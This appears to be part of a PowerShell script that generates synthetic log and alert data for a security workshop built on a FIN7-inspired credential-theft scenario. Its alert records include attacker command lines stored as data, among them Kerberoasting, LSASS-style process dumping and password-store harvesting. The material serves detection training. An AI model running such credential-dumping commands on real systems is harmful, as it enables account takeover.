    $requestUri = if ($offset -eq 7) { "https://graph.microsoft.com/v1.0/users/$($victor.Upn)/messages" } elseif ($offset -eq 8) { "https://graph.microsoft.com/v1.0/users/$($victor.Upn)/drive/root/children" } else { 'https://graph.microsoft.com/v1.0/users' }
    Add-Record -Table 'GraphApiAuditEvents' -Time $StartTime.AddMinutes($offset) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes($offset)
        IdentityProvider = 'AzureAD'
        ApiVersion = 'v1.0'
        ApplicationId = New-StableGuid 'malicious-oauth'
        IPAddress = $externalIp
        ClientRequestId = New-StableGuid "client-graph-$offset"
        EntityType = if ($offset -eq 7) { 'Message' } elseif ($offset -eq 8) { 'DriveItem' } else { 'User' }
        RequestUri = $requestUri
        AccountObjectId = $victor.ObjectId
        OperationId = New-StableGuid "graph-op-$offset"
        Location = 'DE'
        RequestDuration = 143
        RequestId = New-StableGuid "graph-request-$offset"
        RequestMethod = 'GET'
        ResponseStatusCode = 200
        Scopes = 'Mail.Read Files.Read.All offline_access'
        UniqueTokenIdentifier = New-StableGuid 'graph-token'
        TargetWorkload = 'MicrosoftGraph'
        ServicePrincipalId = New-StableGuid 'malicious-oauth-sp'
        ResponseSize = 40896
    }
    Add-Record -Table 'MicrosoftGraphActivityLogs' -Time $StartTime.AddMinutes($offset) -Values @{
        TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes($offset)
        TenantId = $tenantId
        UserId = $victor.ObjectId
        AppId = New-StableGuid 'malicious-oauth'
        IPAddress = $externalIp
        RequestMethod = 'GET'
        RequestUri = $requestUri.Replace('https://graph.microsoft.com', '')
        ResponseStatusCode = 200
        UserAgent = 'Mozilla/5.0 FIN7-workshop'
        ServicePrincipalId = New-StableGuid 'malicious-oauth-sp'
        SignInActivityId = New-StableGuid 'signin-log'
        UniqueTokenId = New-StableGuid 'graph-token'
        Type = 'MicrosoftGraphActivityLogs'
    }
}

$alerts = @(
    [pscustomobject]@{ Id = 'FIN7-001'; Offset = 15; Title = 'Suspicious PowerShell credential discovery'; Category = 'CredentialAccess'; Severity = 'Medium'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1552.002'; Entity = 'Process'; File = 'powershell.exe'; Command = 'collect-reg-creds.ps1' },
    [pscustomobject]@{ Id = 'FIN7-002'; Offset = 35; Title = 'Suspected Kerberoasting activity'; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Identity'; Technique = 'T1558.003'; Entity = 'User'; File = "$toolRu.exe"; Command = "$toolRu.exe kerberoast" },
    [pscustomobject]@{ Id = 'FIN7-003'; Offset = 50; Title = "Credential dumping from $targetLs"; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1003.001'; Entity = 'File'; File = "$targetLsLower.dmp"; Command = "$toolProc.exe -ma $targetLsLower.exe" },
    [pscustomobject]@{ Id = 'FIN7-004'; Offset = 65; Title = 'Password store harvesting tool observed'; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1555'; Entity = 'Process'; File = "$toolLa.exe"; Command = "$toolLa.exe all" },
    [pscustomobject]@{ Id = 'FIN7-005'; Offset = 73; Title = "$toolMi credential dumping"; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1003.001'; Entity = 'Process'; File = "$($toolMi.ToLower()).exe"; Command = $secretVerb }
)
foreach ($alert in $alerts) {
    $time = $StartTime.AddMinutes($alert.Offset)
    Add-Record -Table 'AlertInfo' -Time $time -Values @{
        Timestamp = Format-WorkshopTime $time
        AlertId = $alert.Id
        Title = $alert.Title
        Category = $alert.Category
        Severity = $alert.Severity
        ServiceSource = $alert.Source
        DetectionSource = if ($alert.Source -like '*Identity') { 'MDI sensor' } else { 'MDE sensor' }
        AttackTechniques = $alert.Technique
    }
    Add-Record -Table 'AlertEvidence' -Time $time -Values @{
        Timestamp = Format-WorkshopTime $time
        AlertId = $alert.Id
        Title = $alert.Title
        Categories = "[`"$($alert.Category)`"]"
        AttackTechniques = $alert.Technique
        ServiceSource = $alert.Source
        DetectionSource = if ($alert.Source -like '*Identity') { 'MDI sensor' } else { 'MDE sensor' }
        EntityType = $alert.Entity
        EvidenceRole = 'Impacted'
        EvidenceDirection = 'Source'
        FileName = $alert.File
        FolderPath = "$stage\$($alert.File)"
        AccountName = $victor.Name
        AccountDomain = $adDomain
        AccountSid = $victor.Sid
        AccountObjectId = $victor.ObjectId
        AccountUpn = $victor.Upn
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        LocalIP = $win04.IP
        ProcessCommandLine = $alert.Command
        AdditionalFields = "{`"ThreatActor`":`"FIN7-inspired`",`"Technique`":`"$($alert.Technique)`"}"
        Severity = $alert.Severity
    }
}

Add-Record -Table 'AADRiskyUsers' -Time $StartTime.AddMinutes(2) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(2)
    AADTenantId = $tenantId
    Id = $victor.ObjectId
    UserPrincipalName = $victor.Upn
    RiskLevel = 'high'
    RiskState = 'atRisk'
    RiskDetail = 'none'
    Type = 'AADRiskyUsers'
}
Add-Record -Table 'AADUserRiskEvents' -Time $StartTime.AddMinutes(2) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(2)
    AADTenantId = $tenantId
    Id = New-StableGuid 'risk-event-victor'
    UserPrincipalName = $victor.Upn
    UserId = $victor.ObjectId
    RiskEventType = 'unfamiliarFeatures'
    RiskLevel = 'high'
    RiskState = 'atRisk'
    IpAddress = $externalIp
    Location = 'DE'
    Type = 'AADUserRiskEvents'
}

foreach ($table in $script:Schemas.Keys) {
    if ($script:Records[$table].Count -gt 0) {
        continue
    }
    Add-Record -Table $table -Time $StartTime.AddMinutes(-10) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes(-10)
        TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(-10)
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        AccountName = $victor.Name
        AccountUpn = $victor.Upn
        AccountObjectId = $victor.ObjectId
        AccountDisplayName = $victor.DisplayName
        AccountDomain = $adDomain
        AADTenantId = $tenantId
        TenantId = $tenantId
        ActionType = 'WorkshopBaseline'
        Application = 'WorkshopBaseline'
        ReportId = 9900
        Type = $table
    }
}

foreach ($table in ($script:Schemas.Keys | Sort-Object)) {
    $path = Join-Path $OutputDirectory "$table.json"
    $lines = foreach ($record in $script:Records[$table]) {
        $record | ConvertTo-Json -Compress -Depth 20
    }
    $lines | Set-Content -Path $path -Encoding UTF8
    Write-Host "Wrote $($script:Records[$table].Count) row(s) to $path"
}

$summary = [ordered]@{
    scenarioName = 'FIN7-inspired hybrid identity credential access'
    startTime = Format-WorkshopTime $StartTime
    tenantDomain = $tenantDomain
    adDomain = $adDomain
    infrastructure = [ordered]@{
        domainControllers = 2
        windows11Endpoints = 10
        ubuntuEndpoints = 5
        entraConnectServers = 1
    }
    compromisedUser = $victor.Upn
    initialDevice = $win04.Name
    attackVectors = $attackSteps | Select-Object Title, Technique, Offset, Command
}

$summary | ConvertTo-Json -Depth 10 | Set-Content -Path (Join-Path $PSScriptRoot '..\data\scenario-summary.json') -Encoding UTF8
